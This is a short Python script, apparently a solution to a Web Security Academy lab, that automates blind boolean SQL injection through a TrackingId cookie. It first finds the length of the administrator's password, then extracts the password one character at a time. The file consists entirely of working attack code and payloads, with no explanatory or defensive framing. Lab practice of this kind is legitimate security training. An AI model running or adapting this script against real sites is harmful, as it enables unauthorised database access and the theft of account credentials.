#!/usr/bin/python3

import requests

password_size = 0
password_chars = "abcdefghijklmnoprqstuvwxyz0123456789"

def send_request(payload):

    host = "https://0ac2008803eba2dac09a775000600091.web-security-academy.net"
    cookies = {"TrackingId":"8MJ6OHYJph6gFv8l" + payload + 
                "; session=g0xrpcLVHwG4gQLKfUtLZgmnq9zk8Cni"}
    response = requests.get(host, cookies=cookies)
    return response

def search_string (response):

    if ("Welcome" not in response.text):
        return False
    else:
        return True

def password_length():

    for i in range (1,30):
        payload = ("' AND (SELECT length(password) FROM users WHERE "
                    "username = 'administrator')={}-- -".format(i))
        response = send_request(payload)
        if (search_string(response)):
            print ("Password length is {} characters".format(i))
            global password_size
            password_size = i
            return True

def find_password(password_size):
    print ("Retriving password")
    for i in range(1,password_size+1):
        for j in range(0,len(password_chars)):
            payload = ("' AND (SELECT substring(password,{},1) FROM users WHERE"
            " username='administrator')='{}'-- -".format(i,password_chars[j]))
            response = send_request(payload)
            if (search_string(response)):
                print(password_chars[j], sep='', end='', flush=True)
                break
    print("\nDone!")

if __name__ == "__main__":    
    if (password_length()):
        find_password(password_size)